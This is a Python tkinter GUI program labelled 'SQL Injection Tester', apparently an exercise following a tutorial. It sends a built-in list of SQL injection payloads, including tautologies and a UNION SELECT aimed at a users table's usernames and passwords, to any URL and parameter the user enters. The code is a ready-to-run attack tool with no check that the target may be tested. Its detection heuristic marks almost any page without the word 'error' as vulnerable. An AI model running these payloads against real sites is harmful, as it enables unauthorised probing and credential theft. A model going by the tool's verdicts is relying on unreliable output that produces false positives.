import tkinter as tk
from tkinter import scrolledtext, messagebox
import requests
# requests.urllib3.disable_warnings(requests.urllib3.exceptions.InsecureRequestWarning) # Optional: to suppress SSL warnings for test environments

# 3. Define the SQL Injection Payloads
# Using the payloads from page 1 of the document
payloads = [
    "' OR '1'='1'",
    "' OR '1'='1' -- ",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' OR 1=1", # As per image, might be "' OR 1=1 -- " based on consistency, but sticking to image
    "\"", # A single double quote
    " UNION SELECT username, password FROM users -- " # Leading space, space after --
]

# 4. Set the SQL Injection Testing Function
def test_sql_injection():
    url = url_entry.get().strip()
    param = param_entry.get().strip()

    # Check if inputs are empty
    if not url or not param:
        messagebox.showwarning("Input Error", "Please enter both URL and parameter name.")
        return

    results_text.delete('1.0', tk.END)  # Clear previous results

    # Add http:// if not present, basic check
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        url_entry.delete(0, tk.END)
        url_entry.insert(0, url)


    results_text.insert(tk.END, f"Testing URL: {url} with parameter: {param}\n\n")

    vulnerable_found = False
    # Loop through SQL Injection payloads and test
    for payload in payloads:
        try:
            # Construct the test URL.
            # For GET requests, parameters are usually appended like ?param=value
            # The 'requests' library handles URL encoding if params are passed as a dict.
            # Here, we are manually constructing the URL string.
            # Basic payload construction as implied by the document:
            if '?' in url:
                test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"
            
            # Add a User-Agent header to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }

            # Send HTTP request, allow redirects, verify SSL (can be set to False for test envs)
            response = requests.get(test_url, timeout=10, headers=headers, allow_redirects=True, verify=True) # verify=False for self-signed certs

            # Check if the response suggests vulnerability
            # This is a very simplistic check as per the document.
            # Real-world detection is much more complex.
            response_text_lower = response.text.lower()
            
            # A more robust check might look for specific SQL error messages,
            # unexpected data, or changes in application behavior.
            # The document's criteria: if "error" is NOT in response.text.lower()
            # Common SQL errors often contain "error", "syntax", "warning", "mysql", "sql", "oracle", "postgre"
            # So, `not "error" in response_text_lower` might be too broad.
            # Let's refine this slightly based on common knowledge for SQLi:
            # If a generic payload like 'OR '1'='1' works, it often bypasses login or shows more data.
            # The absence of an error, for some payloads, can indicate success.
            # However, if the page *normally* doesn't have "error" and an attack *causes* an SQL error, then "error" appearing would be an indicator.
            # The document's logic: `if "error" not in response.text.lower(): results_text.insert(tk.END, f" Vulnerable: {test_url}\n", "green")`
            # This means if the page loads *without* an error string, it's marked vulnerable.
            # This is highly dependent on the specific application and error handling.
            # For the sake of following the document:
            
            # Simplified check from document:
            # if "error" not in response.text.lower():
            # More specific heuristic (still basic):
            # Check for common SQL error patterns OR if a known "always true" payload
            # changes the page content significantly from a known baseline (hard to do here).
            # For this exercise, we'll stick to the document's broad check if no error means vulnerable.
            
            # A more typical (but still simple) check:
            # Look for known SQL error strings if the payload is designed to break syntax
            # OR check for content changes if payload is 'OR 1=1'
            # The document's condition is `if "error" not in response.text.lower():` mark as vulnerable.
            # This implies that a successful injection results in a page *without* the word "error".

            is_potentially_vulnerable = False
            # Example: if payload is "' OR '1'='1'" and page loads without "error"
            if "error" not in response_text_lower and \
               ("you have an error in your sql syntax" not in response_text_lower and \
                "warning: mysql" not in response_text_lower and \
                "unclosed quotation mark" not in response_text_lower and \
                "odbc drivers error" not in response_text_lower):
                is_potentially_vulnerable = True


            if is_potentially_vulnerable:
                results_text.insert(tk.END, f"✅ Potentially Vulnerable: {payload}\n", "green")
                results_text.insert(tk.END, f"   URL: {test_url}\n", "green_url")
                vulnerable_found = True
            else:
                # If specific SQL errors ARE found, that's also an indicator of vulnerability
                sql_error_indicators = [
                    "you have an error in your sql syntax", "warning: mysql",
                    "unclosed quotation mark", "odbc driver error", "ORA-", "pg_query()",
                    "supplied argument is not a valid MySQL result resource"
                ]
                found_sql_error_in_response = any(err_indicator in response_text_lower for err_indicator in sql_error_indicators)

                if found_sql_error_in_response:
                    results_text.insert(tk.END, f"⚠️ SQL Error Detected (Indicates Vulnerability): {payload}\n", "orange")
                    results_text.insert(tk.END, f"   URL: {test_url}\n", "orange_url")
                    vulnerable_found = True # SQL errors are a strong sign of SQLi
                else:
                    results_text.insert(tk.END, f"❌ Not Vulnerable (or test inconclusive): {payload}\n", "red")
                    results_text.insert(tk.END, f"   URL: {test_url}\n", "red_url")
            
            results_text.insert(tk.END, f"   Status Code: {response.status_code}\n\n")


        except requests.exceptions.Timeout:
            results_text.insert(tk.END, f"⏳ Timeout for payload: {payload}\n", "orange")
            results_text.insert(tk.END, f"   URL: {test_url}\n\n", "orange_url")
        except requests.exceptions.RequestException as e:
            results_text.insert(tk.END, f"🔗 Error connecting for payload: {payload}\n   {str(e)}\n", "orange")
            results_text.insert(tk.END, f"   URL: {test_url}\n\n", "orange_url")
        except Exception as e:
            results_text.insert(tk.END, f"Unexpected error with payload: {payload}\n   {str(e)}\n", "orange")
            results_text.insert(tk.END, f"   URL: {test_url}\n\n", "orange_url")
        
        results_text.see(tk.END) # Scroll to the end
        root.update_idletasks() # Update GUI

    if not vulnerable_found:
        results_text.insert(tk.END, "--- Test Complete: No clear vulnerabilities detected with these payloads ---\n", "blue")
    else:
        results_text.insert(tk.END, "--- Test Complete: Potential vulnerabilities found. Manual verification required. ---\n", "blue")
    results_text.see(tk.END)


# 5. Create the GUI Interface
# Create GUI Window
root = tk.Tk()
root.title("SQL Injection Tester")
root.geometry("700x600")

# Main frame
main_frame = tk.Frame(root, padx=10, pady=10)
main_frame.pack(fill=tk.BOTH, expand=True)

# Input frame
input_frame = tk.Frame(main_frame)
input_frame.pack(fill=tk.X, pady=5)

# a. URL Entry Field
tk.Label(input_frame, text="Target URL:", font=("Arial", 12)).pack(side=tk.LEFT, padx=5)
url_entry = tk.Entry(input_frame, width=60, font=("Arial", 12)) # Increased width
url_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)

# Parameter frame
param_frame = tk.Frame(main_frame)
param_frame.pack(fill=tk.X, pady=5)

# b. Parameter Entry Field
tk.Label(param_frame, text="Parameter Name:", font=("Arial", 12)).pack(side=tk.LEFT, padx=5)
param_entry = tk.Entry(param_frame, width=53, font=("Arial", 12)) # Adjusted width
param_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)

# c. Run Test Button
test_button = tk.Button(main_frame, text="Run SQL Injection Test", command=test_sql_injection, font=("Arial", 12, "bold"), bg="#4CAF50", fg="white")
test_button.pack(pady=10, fill=tk.X)

# d. Scrollable Output Box
tk.Label(main_frame, text="Results:", font=("Arial", 12, "bold")).pack(anchor=tk.W)
results_text = scrolledtext.ScrolledText(main_frame, width=80, height=20, font=("Courier New", 10), wrap=tk.WORD)
results_text.pack(pady=5, fill=tk.BOTH, expand=True)

# Color Coding for Results
results_text.tag_configure("green", foreground="green", font=("Courier New", 10, "bold"))
results_text.tag_configure("green_url", foreground="darkgreen")
results_text.tag_configure("red", foreground="red", font=("Courier New", 10, "bold"))
results_text.tag_configure("red_url", foreground="darkred")
results_text.tag_configure("orange", foreground="orange red", font=("Courier New", 10, "bold"))
results_text.tag_configure("orange_url", foreground="chocolate")
results_text.tag_configure("blue", foreground="blue", font=("Courier New", 10, "italic"))


# 6. Run the Application
# Run GUI
if __name__ == "__main__":
    root.mainloop()
